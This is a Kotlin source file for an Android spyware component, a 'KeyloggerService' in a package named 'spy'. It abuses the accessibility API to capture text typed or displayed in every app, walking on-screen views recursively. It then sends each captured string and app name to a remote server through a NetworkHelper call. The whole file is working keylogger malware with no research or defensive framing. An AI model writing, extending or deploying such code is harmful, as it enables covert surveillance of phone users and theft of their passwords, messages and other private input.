package com.gauravhanna.spy

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.content.Intent
import android.os.Build
import android.text.TextUtils
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class KeyloggerService : AccessibilityService() {
    
    companion object {
        private const val TAG = "KeyloggerService"
        private var instance: KeyloggerService? = null
        
        fun isRunning(): Boolean = instance != null
        
        fun start(context: Context) {
            val intent = Intent(context, KeyloggerService::class.java)
            context.startService(intent)
        }
    }
    
    private val executor = Executors.newSingleThreadScheduledExecutor()
    private var lastText = ""
    private var lastPackage = ""
    private var lastTimestamp = 0L
    
    override fun onCreate() {
        super.onCreate()
        instance = this
        Log.d(TAG, "KeyloggerService created")
    }
    
    override fun onServiceConnected() {
        super.onServiceConnected()
        
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPES_ALL_MASK
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                    AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    AccessibilityServiceInfo.FLAG_REQUEST_TOUCH_EXPLORATION_MODE
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                flags = flags or AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS
            }
        }
        
        setServiceInfo(info)
        Log.d(TAG, "KeyloggerService connected")
        
        // Schedule periodic buffer flush
        executor.scheduleAtFixedRate({
            flushBuffer()
        }, 5, 5, TimeUnit.SECONDS)
    }
    
    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        
        val packageName = event.packageName?.toString() ?: return
        
        // Collect text from different event types
        val text = when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED,
            AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED,
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                extractTextFromEvent(event)
            }
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                extractTextFromSource(event.source)
            }
            else -> null
        }
        
        if (!text.isNullOrEmpty() && text != lastText) {
            val currentTime = System.currentTimeMillis()
            
            // Debounce similar texts within 500ms
            if (lastPackage == packageName && 
                text == lastText && 
                currentTime - lastTimestamp < 500) {
                return
            }
            
            lastText = text
            lastPackage = packageName
            lastTimestamp = currentTime
            
            Log.d(TAG, "Keylog: $packageName -> $text")
            
            // Send to server
            NetworkHelper.sendKeylog(this, packageName, text)
        }
    }
    
    private fun extractTextFromEvent(event: AccessibilityEvent): String? {
        val texts = mutableListOf<String>()
        
        // Get text from event
        for (i in 0 until event.text.size) {
            event.text[i]?.let { texts.add(it.toString()) }
        }
        
        // Get content description
        event.contentDescription?.let { texts.add(it.toString()) }
        
        return if (texts.isNotEmpty()) {
            TextUtils.join(" ", texts)
        } else {
            extractTextFromSource(event.source)
        }
    }
    
    private fun extractTextFromSource(node: AccessibilityNodeInfo?): String? {
        node ?: return null
        
        val texts = mutableListOf<String>()
        
        try {
            // Get node text
            node.text?.let { texts.add(it.toString()) }
            
            // Get content description
            node.contentDescription?.let { texts.add(it.toString()) }
            
            // Get hint text (for EditText)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                node.hintText?.let { texts.add(it.toString()) }
            }
            
            // Get selected text
            if (node.isEditable) {
                val selectionStart = node.textSelectionStart
                val selectionEnd = node.textSelectionEnd
                if (selectionStart >= 0 && selectionEnd > selectionStart) {
                    node.text?.let { text ->
                        if (selectionEnd <= text.length) {
                            texts.add(text.substring(selectionStart, selectionEnd).toString())
                        }
                    }
                }
            }
            
            // Recursively get text from children
            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { child ->
                    extractTextFromSource(child)?.let { texts.add(it) }
                }
            }
        } finally {
            node.recycle()
        }
        
        return if (texts.isNotEmpty()) TextUtils.join(" ", texts) else null
    }
    
    private fun flushBuffer() {
        // Clear buffer if no activity
        if (System.currentTimeMillis() - lastTimestamp > 10000) {
            lastText = ""
            lastPackage = ""
        }
    }
    
    override fun onInterrupt() {
        Log.d(TAG, "KeyloggerService interrupted")
    }
    
    override fun onDestroy() {
        super.onDestroy()
        instance = null
        executor.shutdown()
        Log.d(TAG, "KeyloggerService destroyed")
    }
}